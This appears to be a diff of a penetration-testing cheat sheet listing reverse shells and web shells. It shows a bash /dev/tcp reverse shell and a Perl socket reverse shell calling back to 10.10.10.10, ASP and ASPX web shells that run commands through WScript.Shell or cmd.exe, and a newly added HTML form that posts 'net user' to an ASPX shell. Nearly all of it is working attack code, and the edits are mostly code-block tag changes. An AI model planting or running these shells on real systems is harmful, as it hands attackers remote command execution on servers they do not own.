@@ -55,14 +55,14 @@ bash -c 'bash -i >& /dev/tcp/10.10.10.10/4444 0>&1' > rev.sh
 ## Perl
 
 {% code overflow="wrap" %}
-```
+```bash
 perl -e 'use Socket;$i="10.10.10.10";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");};'
 ```
 {% endcode %}
 
 ## ASPX
 
-```basic
+```bash
 <%
 Set rs = CreateObject("WScript.Shell")
 Set cmd = rs.Exec("cmd /c whoami")
@@ -79,7 +79,7 @@ Response.write(o)
 ```
 
 {% code title="cmdasp.aspx" %}
-```aspnet
+```bash
 <%@ Page Language="C#" Debug="true" Trace="false" %>
 <%@ Import Namespace="System.Diagnostics" %>
 <%@ Import Namespace="System.IO" %>
@@ -122,10 +122,34 @@ Response.Write("</pre>");
 ```
 {% endcode %}
 
+```bash
+<html>
+<body>    
+<form method="post" action="./abaredteam.aspx" id="ctl00">
+<div class="aspNetHidden">
+<input type="hidden" name="__VIEWSTATE" id="__VIEWSTATE" value="/wEPDwUKLTk5MjkzMTA5MWRkqnW3A3XJf51UWUD2B/WKEqzy75196guiwN6wpBe5Y+c=" />
+</div>
+
+<div class="aspNetHidden">
+
+	<input type="hidden" name="__VIEWSTATEGENERATOR" id="__VIEWSTATEGENERATOR" value="1DD36CC1" />
+	<input type="hidden" name="__EVENTVALIDATION" id="__EVENTVALIDATION" value="/wEdAAQJC5Gj0+FR6cB7mH2o6jlhEfa0FWw4vgp/0+fu1qvypQc3B/7KMkdKn/DwVeVRtd5jVtf4N5S/d4eaM1iQEKJvQFQON07VyPSM0IJno0nGELZDAS4cHtrIxF8Z5kNwsnA=" />
+</div>        
+<p><span id="L_p" style="display:inline-block;width:80px;">Program</span>        
+<input name="xpath" type="text" value="c:\windows\system32\cmd.exe" id="xpath" style="width:300px;" />        
+<p><span id="L_a" style="display:inline-block;width:80px;">Arguments</span>        
+<input name="xcmd" type="text" value="/c net user" id="xcmd" style="width:300px;" />        
+<p><input type="submit" name="Button" value="Run" id="Button" style="width:100px;" />        
+<p><span id="result"></span>       
+</form>
+</body>
+</html>
+```
+
 ## ASP
 
 {% code overflow="wrap" %}
-```basic
+```bash
 <%response.write CreateObject("WScript.Shell").Exec(Request.QueryString("cmd")).StdOut.Readall()%>
 
 curl 10.10.10.10/cmd.asp?cmd=whoami
